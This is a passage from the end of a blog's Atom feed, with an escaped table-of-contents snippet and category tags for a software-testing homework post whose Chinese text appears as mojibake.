&lt;li&gt;&lt;a href=&quot;#problem&quot;&gt;é—®é¢˜æè¿°&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#answer&quot;&gt;é—®é¢˜è§£ç­”&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&quot;problem&quot;&gt;é—®é¢˜æè¿°
      
    
    </summary>
    
      <category term="ä½œä¸š" scheme="https://blog.liebes.top/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="è½¯ä»¶æµ‹è¯•ä½œä¸š" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
</feed>
